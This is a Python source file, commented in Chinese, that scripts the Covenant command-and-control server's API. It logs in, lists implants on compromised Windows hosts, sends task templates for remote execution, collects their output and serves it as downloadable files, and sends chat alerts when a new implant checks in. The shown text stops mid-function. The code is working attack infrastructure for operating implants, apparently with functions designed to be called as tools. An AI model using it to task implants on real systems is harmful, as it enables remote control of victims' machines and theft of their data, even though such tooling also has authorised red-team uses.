import requests
import json
import code
import datetime
import copy
import random
import time
import os
import threading
import filetype
import base64
import uuid
import shutil
import re

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 飞书通知WebHook(可选)
webhook_url = "https://open.feishu.cn/open-apis/bot/v2/hook/<TOKEN>"
CovenantURL = "https://10.12.28.47:7443"
Flask_URL = "http://10.12.28.47:7444"
EVENT_CHECKING_TIME = 1
Auth = {
    'Content-Type': 'application/json',
    "Authorization":"Bearer <TOKEN>"
}
self_userid = ""

from flask import Flask, send_from_directory
app = Flask(__name__)

tmpdata_dir = os.path.join(app.root_path, 'tmpdata')
if os.path.exists(tmpdata_dir):
    try:
        shutil.rmtree(tmpdata_dir)
    except Exception as e:
        print(f"Error deleting tmpdata directory: {e}")
if not os.path.exists(tmpdata_dir):
    os.makedirs(tmpdata_dir)

@app.route('/tmpdata/<path:filename>')
def get_tmpdata_file(filename):
    """
    从 tmpdata 目录提供文件。
    :param filename:  文件名 (URL 中 /tmpdata/ 后面的部分)
    :return: 文件内容
    """
    return send_from_directory(tmpdata_dir, filename)

def run_app():
    app.run(debug=False, use_reloader=False, host="0.0.0.0", port="7444") # 仍然要禁用重载器

def is_base64(s):
    """
    判断一个字符串是否是有效的 Base64 编码。
    """
    if not s: return False
    if isinstance(s, bytes):
        try:
            s = s.decode('utf-8')  # 或者其他合适的编码，例如 'ascii'
        except UnicodeDecodeError:
            return False  # 如果解码失败，则不是有效的 Base64
    if not isinstance(s, str):
        return False
    # 检查长度是否是4的倍数
    if len(s) % 4 != 0:
        return False
    # 检查是否只包含 Base64 字符集中的字符
    if not re.match('^[A-Za-z0-9+/]*={0,2}$', s):
        return False
    # 检查填充字符的位置
    if '=' in s:
        if s.endswith('=='):
            pass
        elif s.endswith('='):
            pass
        else:
            return False
    return True

def SaveFile_To_Url(Data:bytes|str, MustSave=False):
    try:
        if not is_base64(Data): raise Exception("Not Base64")
        OutputData = base64.b64decode(Data)
        with open("tmp.data", "wb") as f:
            f.write(OutputData)
        file_type = filetype.guess("tmp.data")
        if file_type:
            mime = file_type.mime
        else:
            mime = "Base64 text/plain"
    except:
        mime = "text/plain"
        OutputData = Data
        if not MustSave: return ("", mime)
        
    if "text" in mime: extension = ".txt"
    elif mime.split("/")[1].isalnum(): extension = "." + mime.split("/")[1]
    else: extension = ".data"

    filename = f"{uuid.uuid4()}{extension}"
    if type(OutputData) == bytes:
        f = open(os.path.join(tmpdata_dir, filename),'wb')
    else:
        f = open(os.path.join(tmpdata_dir, filename),'w',encoding='utf-8')
    f.write(OutputData)
    f.close()
    return (Flask_URL+"/tmpdata/"+filename,mime)
    
def Username_Get_UserID(username) -> dict:
    """
    根据用户名获取用户ID

    Args:
        username (str): 用户名

    Return:
        dict: 包含用户ID的字典或错误信息字典
    """
    api = "/api/users"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        for i in data:
            if i['UserName'] == username:
                global self_userid
                self_userid = i['Id']
                return {
                    "Success": True,
                    "UserID": i["Id"]
                }
        # print("找不到对应用户")
        return {
            "Success": False,
            "Error": "找不到对应用户"
        }
    except requests.exceptions.RequestException as e:
        print(f"调用Username_Get_UserID接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用Username_Get_UserID接口错误: {e}  ResponseData: {response.text}"
        }
   
def login(username, password) -> dict:
    """
    进行首次登录，并返回 JWT token 且替换全局TOKEN

    Args:
        username (str): 用户名
        password (str): 密码
    
    Returns:
        dict: 包含登录状态和JWT token的字典，如果登录失败则返回错误信息字典
    """
    api = "/api/users/login"
    payload = json.dumps({
        "userName": username,
        "password": password
    })
    try:
        response = requests.post(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功

        data = response.json()
        if data.get("Success") and data["Success"] == True:
            jwt = data.get("CovenantToken")
            Auth['Authorization'] = f"Bearer {jwt}"
            UserId = Username_Get_UserID(username)
            if not UserId["Success"]:
                return UserId
            # print(f"登录成功, JWT: {jwt}")
            return {
                "Success": True,
                "JWT": jwt
            }
        else:
            print(f"登录失败")
            return {
                "Success": False,
                "Error": "Username or Password is incorrect. Please try again."
            }
    except requests.exceptions.RequestException as e:
        print(f"调用Login接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用Login接口错误: {e}  ResponseData: {response.text}"
        }
     
def GetGruntCommands() -> dict:
    """
    返回所有命令(GruntCommand)信息的列表

    Return:
       dict: 包含执行状态与所有命令信息列表的字典，每个命令信息是一个字典列表
    """
    api = "/api/commands"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = copy.deepcopy(data)
        savecolumns = ['Id','Command','CommandTime','CommandOutputId','UserId','User','GruntTaskingId','GruntId']
        for i in range(len(data)):
            for j in data[i].keys():
                if j not in savecolumns:
                    del resdata[i][j]
            resdata[i]['User'] = resdata[i]['User']['UserName']
        return {
            "Success": True,
            "GruntCommands": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetGruntCommands接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetGruntCommands接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetGruntTasking(GruntTaskingId: int) -> dict:
    """
    获取指定的已下发任务(GruntTasking)信息

    Args:
       GruntTaskingId (int): 任务ID
    
    Returns:
        dict: 包含任务信息的字典
    """
    api = f"/api/taskings/{GruntTaskingId}"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = {}
        savecolumns = ['Id','GruntCommandId','TaskingTime','CompletionTime','Status','GruntTaskId','GruntId',"Type","Parameters"]
        for k, v in data.items():
            if k in savecolumns:
                resdata[k] = v
        return {
            "Success": True,
            "GruntTasking": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetGruntTasking接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetGruntTasking接口错误: {e}  ResponseData: {response.text}"
        }

def GetGruntCommandsCount() -> dict:
    """
    返回所有命令(GruntCommand)的数量

    Return:
        dict: 包含执行状态和命令数量的字典
    """
    api = "/api/commands"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        return {
            "Success": True,
            "GruntCommandsCount": len(data)
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetGruntCommandCount接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetGruntCommandCount接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetCommandOutput(CommandOutputId:int) -> dict:
    """
    获取指定命令输出(CommandOutput)Id的对象

    Args:
       CommandOutputId (int): 命令输出Id

    Return:
        dict: 包含执行状态和CommandOutput对象的字典，如果CommandOutputId不存在则返回错误信息。
    """
    api = f"/api/commandoutputs/{CommandOutputId}"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "CommandOutput": data
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用GetCommandOutput接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetCommandOutput接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetGruntTasks(CompatibleDotNetVersions:list = ["net35","net40"]) -> dict:
    """
    获取所有任务模板(GruntTask)

    Args:
        CompatibleDotNetVersions (list, optional): 筛选 .NET 版本列表，只有当任务模板的 CompatibleDotNetVersions 包含至少一个版本才会被返回， 默认为 ["net35", "net40"]。
    
    Returns:
        dict: 包含所有任务模板字典的列表，格式如下：
            [
                {
                    "Id": 1,
                    "Name": "Task name",
                    "Aliases": [
                        "alias1"
                    ],
                    "Description": "Task Description",
                    "Params": [
                        {
                        "Id": 11,
                        "Name": "param1",
                        "Value": "value1(You can modify this by EditGruntTask Tools/Function.)",
                        "Description": "param1 Description",
                        "Optional": false,
                        "FileOption": false,
                        "GruntTaskId": 1
                        }
                    ]
                }
            ]
    """
    api = f"/api/grunttasks"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = copy.deepcopy(data)
        savecolumns = ['Id','Name','Aliases','Description','CompatibleDotNetVersions']
        poplist = []
        for i in range(len(data)):
            InCompatibleDotNetVersions = False
            for j in data[i]['CompatibleDotNetVersions']:
                if j in CompatibleDotNetVersions:
                    InCompatibleDotNetVersions = True
                    break
            if not InCompatibleDotNetVersions:
                poplist.append(i)
                continue
            for j in data[i].keys():
                if j not in savecolumns:
                    del resdata[i][j]
            resdata[i]['Params'] = []
            for j in data[i]['Options']:
                resdata[i]['Params'].append({"Id":j['Id'],"Name":j['Name'],"Value":j['Value'],"Description":j['Description'],"Optional":j['Optional'],"FileOption":j['FileOption'],"GruntTaskId":j['GruntTaskId']})
        for i in poplist[::-1]:
            resdata.pop(i)
        return {
            "Success": True,
            "GruntTasks": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetGruntTasks接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetGruntTasks接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetAvailableGruntTasksByGrunt(GruntId:int) -> dict:
    """
    根据Grunt获取所有可执行的任务模板(GruntTask)

    Args:
        GruntId (int): Grunt ID。
    
    Returns:
        dict: 包含所有任务模板字典的列表，格式如下：
            [
                {
                    "Id": 1,
                    "Name": "Task name",
                    "Aliases": [
                        "alias1"
                    ],
                    "Description": "Task Description",
                    "Params": [
                        {
                        "Id": 11,
                        "Name": "param1",
                        "Value": "value1(You can modify this by EditGruntTask Tools/Function.)",
                        "Description": "param1 Description",
                        "Optional": false,
                        "FileOption": false,
                        "GruntTaskId": 1
                        }
                    ]
                }
            ]
    """
    api = f"/api/grunttasks"

    GruntDotNetVersion = GetGrunt(GruntId)
    if not GruntDotNetVersion["Success"]:
        return GruntDotNetVersion
    GruntDotNetVersion = GruntDotNetVersion['Grunt']['DotNetVersion']

    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = copy.deepcopy(data)
        savecolumns = ['Id','Name','Aliases','Description','CompatibleDotNetVersions']
        poplist = []
        for i in range(len(data)):
            if GruntDotNetVersion not in data[i]['CompatibleDotNetVersions']:
                poplist.append(i)
                continue
            for j in data[i].keys():
                if j not in savecolumns:
                    del resdata[i][j]
            resdata[i]['Params'] = []
            for j in data[i]['Options']:
                resdata[i]['Params'].append({"Id":j['Id'],"Name":j['Name'],"Value":j['Value'],"Description":j['Description'],"Optional":j['Optional'],"FileOption":j['FileOption'],"GruntTaskId":j['GruntTaskId']})
        for i in poplist[::-1]:
            resdata.pop(i)
        return {
            "Success": True,
            "GruntTasks": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetAvailableGruntTasksByGrunt接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetAvailableGruntTasksByGrunt接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetGrunts() -> dict:
    """
    获取所有Grunt信息

    Returns:
        dict: 包含所有Grunt信息字典的数组，格式如下：
            {
                "Success": True,
                "Grunts": [
                    {
                        "Id": 1(GruntId),
                        "Name": "Grunt Name",
                        "Children": [],
                        "ImplantTemplateId": 1,
                        "ListenerId": 1,
                        "Delay": 1,
                        "JitterPercent": 0,
                        "ConnectAttempts": 5000,
                        "KillDate": "2025-06-25T10:06:12.2234531",
                        "DotNetVersion": "net35",
                        "RuntimeIdentifier": "win_x64",
                        "Status": "active",
                        "Integrity": "high",
                        "Process": "powershell",
                        "UserDomainName": "PENETRATIONS",
                        "UserName": "Anonymous",
                        "IPAddress": "172.30.96.1",
                        "Hostname": "penetrations",
                        "OperatingSystem": "Microsoft Windows NT 10.0.19045.0",
                        "ActivationTime": "2025-05-26T02:10:39.9287381",
                        "LastCheckIn": "2025-05-26T03:02:39.1389711"
                    }
                ]
            }
    """
    api = f"/api/grunts"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = copy.deepcopy(data)
        savecolumns = ['Id','Name','Children','ImplantTemplateId','ListenerId','Delay','JitterPercent','ConnectAttempts','KillDate','DotNetVersion','RuntimeIdentifier','Status','Integrity','Process','UserDomainName','UserName','IPAddress','Hostname','OperatingSystem','ActivationTime','LastCheckIn']
        for i in range(len(data)):
            for j in data[i].keys():
                if j not in savecolumns:
                    del resdata[i][j]
        return {
            "Success": True,
            "Grunts": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetGrunts接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetGrunts接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetActiveGrunts() -> dict:
    """
    获取所有活跃的Grunt信息

    Returns:
        dict: 包含所有Grunt信息字典的数组，格式如下：
            {
                "Success": True,
                "Grunts": [
                    {
                        "Id": 1(GruntId),
                        "Name": "Grunt Name",
                        "Children": [],
                        "ImplantTemplateId": 1,
                        "ListenerId": 1,
                        "Delay": 1,
                        "JitterPercent": 0,
                        "ConnectAttempts": 5000,
                        "KillDate": "2025-06-25T10:06:12.2234531",
                        "DotNetVersion": "net35",
                        "RuntimeIdentifier": "win_x64",
                        "Status": "active",
                        "Integrity": "high",
                        "Process": "powershell",
                        "UserDomainName": "PENETRATIONS",
                        "UserName": "Anonymous",
                        "IPAddress": "172.30.96.1",
                        "Hostname": "penetrations",
                        "OperatingSystem": "Microsoft Windows NT 10.0.19045.0",
                        "ActivationTime": "2025-05-26T02:10:39.9287381",
                        "LastCheckIn": "2025-05-26T03:02:39.1389711"
                    }
                ]
            }
    """
    api = f"/api/grunts"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        resdata = copy.deepcopy(data)
        savecolumns = ['Id','Name','Children','ImplantTemplateId','ListenerId','Delay','JitterPercent','ConnectAttempts','KillDate','DotNetVersion','RuntimeIdentifier','Status','Integrity','Process','UserDomainName','UserName','IPAddress','Hostname','OperatingSystem','ActivationTime','LastCheckIn']
        poplist = []
        for i in range(len(data)):
            if data[i]['Status'] != 'active':
                poplist.append(i)
                continue
            for j in data[i].keys():
                if j not in savecolumns:
                    del resdata[i][j]
        for i in poplist[::-1]:
            resdata.pop(i)
        return {
            "Success": True,
            "Grunts": resdata
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetActiveGrunts接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetActiveGrunts接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetGrunt(GruntId:int) -> dict:
    """
    获取指定的Grunt完整信息

    Args:
       GruntId (int): Grunt ID

    Returns:
        dict: 包含Grunt信息的字典
    """
    api = f"/api/grunts/{GruntId}"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        return {
            "Success": True,
            "Grunt": data
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetGrunt接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetGrunt接口错误: {e}  ResponseData: {response.text}"
        }
    
def EditGrunt(GruntId:int, Name:str) -> dict:
    """
    修改指定的Grunt的名称

    Args:
       GruntId (int): Grunt ID
       Name (str): 新的Grunt名称

    Returns:
        dict: 包含修改操作的结果字典
    """
    api = f"/api/grunts"

    rawGrunt = GetGrunt(GruntId)
    if not rawGrunt["Success"]:
        return rawGrunt
    rawGrunt = rawGrunt['Grunt']

    rawGrunt['Name'] = Name
    payload = json.dumps(rawGrunt)

    try:
        response = requests.put(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data['Id']:
            return {
                "Success": True
            }
    except requests.exceptions.RequestException as e:
        print(f"调用EditGrunt接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用EditGrunt接口错误: {e}  ResponseData: {response.text}"
        }

def GetGruntTask(GruntTaskId:int) -> dict:
    """
    获取指定任务模板(GruntTask)的详细信息

    Args:
       GruntTaskId (int): 任务模板ID

    Returns:
       dict: 包含任务模板信息的字典
    """
    api = f"/api/grunttasks/{GruntTaskId}"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "GruntTask": data
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用GetGruntTask接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetGruntTask接口错误: {e}  ResponseData: {response.text}"
        }
    

def EditGruntTask(GruntTaskId:int, EditParms:list) -> dict:
    """
    修改指定的GruntTask参数值，用于替代后续下发任务时的传参

    Args:
        GruntTaskId (int): GruntTask的ID
        EditParms (list): 需要修改的参数列表，格式为[{"Name": "param_name"(参数名称), "Value": "new_value"(参数值)}, ...]

    Returns:
        dict: 修改后的GruntTask信息和执行状态，如果修改成功将返回修改后的GruntTask
    """
    api = f"/api/grunttasks/"

    rawGruntTask = GetGruntTask(GruntTaskId)
    if not rawGruntTask["Success"]:
        return rawGruntTask
    rawGruntTask = rawGruntTask['GruntTask']

    poplist = []
    for i in rawGruntTask['Options']:
        if i['Name'] in [j['Name'] for j in EditParms]:
            for j in range(len(EditParms)):
                if i['Name'] == EditParms[j]['Name']:
                    i['Value'] = EditParms[j]['Value']
                    poplist.append(j)
                    break
    poplist = sorted(poplist)
    for i in poplist[::-1]:
        EditParms.pop(i)
    if EditParms:
        return {
            "Success": False,
            "Error": f"未找到下列参数: {[i['Name'] for i in EditParms]}"
        }
    payload = json.dumps(rawGruntTask)
    try:
        response = requests.put(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "GruntTask": data
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用EditGruntTask接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用EditGruntTask接口错误: {e}  ResponseData: {response.text}"
        }

def CreateCommandOutput() -> dict:
    """
    针对指定的GruntCommandId(预定义)，创建一个命令输出对象

    Returns:
        dict: 包含成功状态和命令输出数据的字典。如果失败，包含错误信息。
    """
    api = "/api/commandoutputs"

    gruntCommandsCount = GetGruntCommandsCount()
    if gruntCommandsCount['Success']:
        gruntCommandsCount = gruntCommandsCount['GruntCommandsCount']
    else: return gruntCommandsCount

    payload = json.dumps({
        "gruntCommandId": gruntCommandsCount+1
    })
    try:
        response = requests.post(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功

        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "CommandOutputId": data['Id'],
                # "GruntCommandId": data['GruntCommandId']
            }
        else:
            return {
                "Success": False,
                "Error": "Status Code: "+ str(response.status_code) + " Response Body: " + data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用CreateCommandOutput接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用CreateCommandOutput接口错误: {e}  ResponseData: {response.text}"
        }
    
def CreateGruntCommand(command:str, gruntId:int) -> dict:
    """
    针对指定的Grunt创建一个GruntCommand对象，并自动创建命令输出对象

    Args:
        command (str): 显示的命令 (仅用于展示给用户更好理解Task实际等价的命令，并非实际执行该命令)
        gruntId (int): Grunt的ID

    Returns:
        dict: 包含GruntCommandId和函数执行状态的字典
    """
    api = "/api/commands"
    
    CommandOutput = CreateCommandOutput()
    if CommandOutput['Success']:
        CommandOutputId = CommandOutput['CommandOutputId']
    else: return CommandOutput

    payload = json.dumps({
        "command": command,
        "commandTime": datetime.datetime.now().isoformat(),
        "commandOutputId": CommandOutputId,
        "userId": self_userid,
        "gruntId": gruntId
    })
    try:
        response = requests.post(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "GruntCommandId": data['Id'],
                "CommandOutputId": CommandOutputId
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用CreateGruntCommand接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用CreateGruntCommand接口错误: {e}  ResponseData: {response.text}"
        }

def CreateGruntTasking(TaskId:int, gruntId:int, command:str) -> dict:
    """
    给Grunt下发一个任务模板(GruntTask)执行，即创建GrunTasking

    Args:
        TaskId (int): 任务模板ID (用于在Grunt上实际执行的任务)
        gruntId (int): Grunt ID
        command (str): 显示的命令 (仅用于展示给用户更好理解Task实际等价的命令，并非实际执行该命令)
    
    Returns:
        dict: 包含GruntTaskingId和函数执行状态的字典
    """
    api = "/api/taskings"

    command = CreateGruntCommand(command, gruntId)
    if command['Success']:
        commandId = command['GruntCommandId']
        CommandOutputId = command['CommandOutputId']
    else: return command

    payload = json.dumps({
        "name": datetime.datetime.now().strftime("%Y%m%d_%H%M%S")+str(random.randint(0, 9)),
        "gruntId": gruntId,
        "gruntTaskId": TaskId,
        "gruntCommandId": commandId
    })
    try:
        response = requests.post(CovenantURL+api, headers=Auth, data=payload, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        if data.get("Id"):
            return {
                "Success": True,
                "GruntTaskingId": data['Id'],
                "GruntCommandId": commandId,
                "CommandOutputId": CommandOutputId
            }
        else:
            return {
                "Success": False,
                "Error": data
            }
    except requests.exceptions.RequestException as e:
        print(f"调用CreateGruntTasking_NoParms接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用CreateGruntTasking_NoParms接口错误: {e}  ResponseData: {response.text}"
        }
    
def WaitToGetGruntTaskingResult(gruntTaskingId:int, commandOutputId:int, interval:int=1, countout:int=20):
    """
    等待下发的任务(GruntTasking)执行完成，并获取任务的执行结果(CommandOutput)

    Args:
        gruntTaskingId (int): 任务ID
        commandOutputId (int): 命令输出ID
        interval (int, optional): 检查间隔时间（秒）, 默认为1秒。
        countout (int, optional): 最大检查次数, 默认为20次, 交互式任务或者耗时长的任务可以将其设置为更大次数。

    Returns:
        dict: 如果命令执行成功，将返回包含执行状态和下发任务的命令输出
    """
    for i in range(countout):
        gruntTasking = GetGruntTasking(gruntTaskingId)
        if gruntTasking['Success']:
            if gruntTasking["GruntTasking"]['Status'] == "completed":
                return {
                    "Success": True,
                    "CommandOutput": GetCommandOutput(commandOutputId)['CommandOutput']['Output']
                }
            elif gruntTasking["GruntTasking"]['Status'] == "aborted":
                return {
                    "Success": False,
                    "CommandOutput": "任务执行错误: "+str(GetCommandOutput(commandOutputId)['CommandOutput']['Output'])
                }
        time.sleep(interval)
        continue
    return {
        "Success": False,
        "GruntTaskingId": gruntTaskingId,
        "CommandOutputId": commandOutputId,
        "Error": "任务已执行，但等待执行结束返回结果时超时，可利用GruntTaskingId通过GetGruntTasking再次获取任务状态是否为completed来判断是否执行完成,并利用CommandOutputId通过GetCommandOutput获取命令输出" if gruntTasking["GruntTasking"]['Status'] == "tasked" else "未知错误, 任务无法被初始化"
    }


def DoTasking(TaskId, gruntId, ViewCommand, params:list[dict] = [], interval:int=1, countout:int=20):
    """
    针对指定的Grunt执行任务模板(GruntTask)，并等待执行完毕后返回任务输出

    Args:
        TaskId (int): 任务模板ID (用于在Grunt上实际执行的任务)
        gruntId (int): Grunt ID
        ViewCommand (str): 显示的命令，格式为 TaskName [<Arg1> <Arg2>...] (仅用于展示给用户更好理解Task实际等价的命令，并非实际执行该命令)
        params (list[dict], optional): 参数列表, 针对某些需要参数的GruntTask, 格式为[{"Name": "param_name"(参数名称), "Value": "new_value"(参数值)}, ...], 默认为空列表(无参数)。
        interval (int, optional): 检查任务状态的时间间隔。默认为1秒。
        countout (int, optional): 最大检查次数。默认为20次。

    Returns:
        dict: 包含任务执行结果的字典。
    """
    if params:
        EditGruntTaskRes = EditGruntTask(TaskId, params)
        if not EditGruntTaskRes['Success']: return EditGruntTaskRes
    CreateGruntTaskingRes = CreateGruntTasking(TaskId, gruntId, ViewCommand)
    if not CreateGruntTaskingRes['Success']: return CreateGruntTaskingRes
    GruntTaskingId = CreateGruntTaskingRes['GruntTaskingId']
    CommandOutputId = CreateGruntTaskingRes['CommandOutputId']
    TaskingResult = WaitToGetGruntTaskingResult(GruntTaskingId, CommandOutputId, interval, countout)
    if not TaskingResult['Success']: return TaskingResult
    Output = TaskingResult['CommandOutput']
    File_URL, File_Type = SaveFile_To_Url(Output)
    if File_Type == "text/plain":
        return {
            "Success": True,
            "ResultOutput": Output,
        }
    else:
        return {
            "Success": True,
            "File_URL": File_URL,
            "File_Type": File_Type
        }

def GetEvents() -> dict:
    """
    获取所有Covenant事件日志信息

    Returns:
        dict: 包含事件信息的字典列表, 格式如下：
        [
            "Success": True,
            "Events":
                {
                    "Id": 1,
                    "Time": "2025-05-26T02:10:39.9287381",
                    "MessageHeader": "Grunt Activated",
                    "MessageBody": "Grunt: 6fe377bcd6 from: penetrations has been activated!",
                    "Level": "highlight",
                    "Type": "normal",
                    "Context": "*"
                }
        ]
    """
    api = "/api/events"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        return {
            "Success": True,
            "Events": data
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetEvents接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetEvents接口错误: {e}  ResponseData: {response.text}"
        }
    
def GetGruntByName(GruntName:str) -> dict:
    """
    获取通过GruntName指定的Grunt完整信息

    Args:
       GruntName (str): Grunt Name

    Returns:
        dict: 包含Grunt信息的字典
    """
    api = f"/api/grunts/{GruntName}"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        return {
            "Success": True,
            "Grunt": data
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetGruntByName接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetGruntByName接口错误: {e}  ResponseData: {response.text}"
        }
    
def Feishu_notify(event):
    try:
        msg_data = {
            "msg_type": "interactive",
            "card": {
                "header": {
                    "title": {
                        "tag": "plain_text",
                        "content": event["MessageHeader"],
                    },
                    "subtitle": {"tag": "plain_text", "content": f'Time: {datetime.datetime.fromisoformat(event["Time"].split(".")[0].replace("Z", "+00:00")).strftime("%Y-%m-%d %H:%M:%S")}'},
                    "template": "green" if event["MessageHeader"] == "Grunt Activated" else "orange" if event["Level"] == "highlight" else "blue" if event['Level'] == "info" else "red" if event['Level'] == "warning" else "violet",
                },
                "elements": [
                    {
                        "tag": "div",
                        "text": {
                            "content": f'**EventID：<font color="blue">'
                            + str(event["Id"])
                            + "</font>**"
                            + "\n"
                            + '**Level: **<font color="yellow">'
                            + event["Level"]
                            + "</font>\n"
                            + '**Type: <font color="red">'
                            + event['Type']
                            + "</font>**\n"
                            + '**Context:** <font color="red">'
                            + event["Context"]
                            + "\n"
                            + ("<at id=all>\n" if event["MessageHeader"] == "Grunt Activated" else ""),
                            "tag": "lark_md",
                        },
                    },
                    {
                        "actions": [
                            {
                                "tag": "button",
                                "text": {"content": "View Grunt in Covenant" if event["MessageHeader"] == "Grunt Activated" else "Go To Covenant", "tag": "lark_md"},
                                "type": "primary",
                                "url": CovenantURL + f"/grunt/interact/{GetGruntByName(event['MessageBody'].split('Grunt: ')[1].split(' from: ')[0])['Grunt']['Id']}" if event["MessageHeader"] == "Grunt Activated" else CovenantURL,
                                "width": "fill",
                                "value": {},
                                "icon": {"tag": "standard_icon", "token": "info_outlined"},
                            }
                        ],
                        "tag": "action",
                    }
                ],
            },
        }
        response = requests.post(webhook_url,json=msg_data)
        response.raise_for_status()  # 检查请求是否成功
        return {"Success": True}
    except requests.exceptions.RequestException as e:
        return {
            "Success": False,
            "Error": str(e)
        }

firsh_init = False
last_events = []
def check_events_and_notify():
    global last_events, firsh_init
    events_data = GetEvents()
    if events_data["Success"]:
        events = events_data["Events"]
        new_events = [event for event in events if event not in last_events]
        if new_events and firsh_init:
            for event in new_events:
                Feishu_notify(event)
        last_events = events
        firsh_init = True
    else:
        print(f"Error getting events: {events_data['Error']}")

def start_event_checking():
    while True:
        check_events_and_notify()
        time.sleep(EVENT_CHECKING_TIME)


def GetListenerTypes() -> dict:
    """
    获取所有监听器类型
    
    Returns:
       dict: 包含监听器类型信息字典的数组，格式如下：
        [
            {
                "Id": 1,
                "Name": "HTTP",
                "Description": "Listens on HTTP protocol."
            }
        ]
    """
    api = "/api/listeners/types"
    try:
        response = requests.get(CovenantURL+api, headers=Auth, verify=False)
        response.raise_for_status()  # 检查请求是否成功
        data = response.json()
        return {
            "Success": True,
            "Events": data
        }
    except requests.exceptions.RequestException as e:
        print(f"调用GetListenerTypes接口错误: {e}  ResponseData: {response.text}")
        return {
            "Success": False,
            "Error": f"调用GetListenerTypes接口错误: {e}  ResponseData: {response.text}"
        }

def GetProfiles() -> dict:
    """
    获取所有Profile信息
    
    Returns:
        dict: 包含Profile信息字典的数组
    """
    api = f"/api/profiles"
    try:
